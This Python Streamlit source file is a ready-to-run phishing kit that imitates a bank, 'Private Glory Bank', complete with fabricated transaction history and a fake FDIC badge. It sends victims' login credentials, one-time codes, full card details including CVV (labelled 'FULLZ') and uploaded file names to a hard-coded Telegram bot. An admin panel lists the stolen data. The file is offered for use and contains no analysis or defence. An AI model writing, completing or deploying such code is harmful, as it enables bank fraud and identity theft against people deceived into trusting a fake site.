import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random

# ==================== TELEGRAM LIVE EXFIL — YOUR REAL BOT ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"   # YOUR REAL TOKEN
    CHAT_ID = "141975691"                                        # YOUR REAL CHAT ID
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except:
        pass

# ==================== SESSION STATE & HYPER-REALISTIC HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)

if "tx" not in state:
    merchants = {
        "Groceries": ["Whole Foods", "Trader Joe's", "Kroger", "Publix"],
        "Dining": ["Starbucks", "Chick-fil-A", "Chipotle", "Panera"],
        "Gas": ["Shell", "Exxon", "Chevron", "Costco Gas"],
        "Shopping": ["Amazon.com", "Target", "Walmart", "Best Buy"],
        "Subscriptions": ["Netflix", "Spotify", "Apple Services", "Hulu"],
        "Utilities": ["Comcast", "Verizon", "Duke Energy", "AT&T"],
        "Insurance": ["Geico", "State Farm"],
        "Rent": ["Zelle to John Smith", "ACH Mortgage"],
        "Income": ["Direct Deposit - ACME CORP", "Paycheck - Employer Inc"],
        "Other": ["Venmo", "Cash App", "Apple Cash"]
    }
    txs = []
    start = datetime.now() - timedelta(days=90)
    for day in range(90):
        date = start + timedelta(days=day)
        num_tx = random.choices([0,1,2,3], weights=[10,40,40,10], k=1)[0]
        for _ in range(num_tx):
            cat = random.choices(list(merchants.keys()), weights=[15,12,10,18,10,8,5,6,8,8], k=1)[0]
            merchant = random.choice(merchants[cat])
            amount = round(random.uniform(8.50, 650.00), 2)
            if cat in ["Subscriptions", "Utilities", "Insurance", "Rent"] and date.day in [1,2,15,28]:
                amount = {"Netflix":15.99, "Spotify":10.99, "Comcast":189.99, "Geico":142.50, "Rent":1850.00}.get(merchant.split()[0], amount)
            acct = "Checking" if cat in ["Income", "Rent"] else random.choice(["Checking", "Savings"])
            txs.append({
                "date": date.strftime("%m/%d"),
                "desc": merchant,
                "amount": amount if cat == "Income" else -amount,
                "account": acct,
                "category": cat
            })
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== REAL EAGLE + THEME + FDIC ====================
EAGLE = "https://i.ibb.co/4pQ8Y3D/eagle-gold-real.png"
FDIC = "https://i.ibb.co/0jF3Y7Q/fdic-ssl.png"

st.markdown(f"""
<style>
    .stApp {{background: linear-gradient(135deg, #0a0e17, #1c1f2e, #0f1629); color: #e0e0e0;}}
    .header {{background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
              padding: 3.5rem; text-align: center; border-bottom: 18px solid #fcca46;
              border-radius: 0 0 100px 100px; box-shadow: 0 40px 90px rgba(0,0,0,0.95);}}
    .glass {{background: rgba(255,255,255,0.1); backdrop-filter: blur(24px);
             border-radius: 42px; border: 1px solid rgba(255,255,255,0.25); padding: 3rem;}}
    .fdic {{position: fixed; bottom: 12px; right: 12px; z-index: 9999;}}
    h1, h2, h3 {{color: #fcca46 !important; text-shadow: 0 0 30px #fcca46;}}
    .stButton>button {{background: linear-gradient(45deg, #BF0A30, #002868); color: white; border-radius: 80px; height: 5.2rem;}}
</style>
<div class="fdic"><img src="{FDIC}" width="300"></div>
""", unsafe_allow_html=True)

def header():
    st.markdown(f'''
    <div class="header">
        <img src="{EAGLE}" width="220">
        <h1>PRIVATE GLORY BANK</h1>
        <p style="font-size:32px;color:#fcca46">Land of the Free • Home of the Brave</p>
    </div>
    ''', unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    header()
    col1, col2, col3 = st.columns([1,1.4,1])
    with col2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        user = st.text_input("User ID", placeholder="Awesome12@")
        pwd = st.text_input("Password", type="password", placeholder="SecureUSA2025!")
        if st.button("Login Securely", type="primary", use_container_width=True):
            tg(f"LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}")
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS — FULL ACCESS")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Access Denied")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    code = st.text_input("Enter 6-digit code", max_chars=6)
    if st.button("Verify", type="primary"):
        tg(f"OTP: {code}")
        if len(code) == 6:
            state.otp_ok = True
            tg("OTP ACCEPTED")
            st.success("Verified")
            st.rerun()

# ==================== DASHBOARD WITH ACCOUNT FILTERING ====================
def dashboard():
    header()
    st.markdown(f"### Good Afternoon • {datetime.now().strftime('%A, %B %d, %Y')}")
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Checking", f"${state.checking:,.2f}")
    c2.metric("Savings", f"${state.savings:,.2f}")
    c3.metric("Total", f"${state.checking + state.savings:,.2f}")
    c4.metric("Security", "99.9%")

    account_view = st.radio("View Transactions", ["Checking", "Savings", "All"], horizontal=True)

    col1, col2 = st.columns([2,1])
    with col1:
        st.markdown("<div class='glass'><h3>Transaction History</h3>", unsafe_allow_html=True)
        filtered = state.tx
        if account_view == "Checking":
            filtered = [t for t in state.tx if t["account"] == "Checking"]
        elif account_view == "Savings":
            filtered = [t for t in state.tx if t["account"] == "Savings"]
        
        df = pd.DataFrame(filtered[:25])
        display = df[["date", "desc", "amount"]].copy()
        display["amount"] = display["amount"].apply(lambda x: f"${x:,.2f}" if x < 0 else f"+${x:,.2f}")
        st.dataframe(display, use_container_width=True, hide_index=True)
        st.markdown("</div>", unsafe_allow_html=True)

    with col2:
        st.markdown("<div class='glass'><h3>Accounts</h3>", unsafe_allow_html=True)
        fig = px.pie(values=[state.checking, state.savings], names=["Checking","Savings"],
                     color_discrete_sequence=["#fcca46","#002868"], hole=0.5)
        st.plotly_chart(fig, use_container_width=True)
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== TRANSFER ====================
def transfer():
    header()
    tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
    with tab1:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
        to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
        amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f")
        if st.button("Transfer Now", type="primary"):
            if "Checking" in from_acc and amount > state.checking:
                st.error("Insufficient funds")
            elif "Savings" in from_acc and amount > state.savings:
                st.error("Insufficient funds")
            else:
                if "Checking" in from_acc:
                    state.checking -= amount
                    state.savings += amount
                else:
                    state.savings -= amount
                    state.checking += amount
                tg(f"INTERNAL TRANSFER\n${amount:,.2f} → {to_acc.split()[0]}")
                st.success("Transfer Complete")
                st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)
    with tab2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        card = st.text_input("Card Number")
        exp = st.text_input("Expiry")
        cvv = st.text_input("CVV", type="password")
        zipc = st.text_input("ZIP")
        payee = st.text_input("Payee")
        amt = st.number_input("Amount", 0.01)
        if st.button("Pay", type="primary"):
            tg(f"FULLZ\nCard: {card}\nExp: {exp}\nCVV: {cvv}\nZIP: {zipc}\nPayee: {payee}\n${amt}")
            st.success("Payment Processed")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES ====================
def messages():
    header()
    st.markdown("<div class='glass'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload Documents")
    if uploaded:
        tg(f"FILE UPLOADED\n{uploaded.name}")
        st.success("Received")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== ADMIN ====================
def admin():
    header()
    st.markdown("<h1 style='color:#fcca46'>ADMIN PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)])
    with tabs[3]: st.write(state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f'<img src="{EAGLE}" width="100">', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Messages", "Logout"])

# ==================== MAIN ====================
if not state.auth:
    login()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
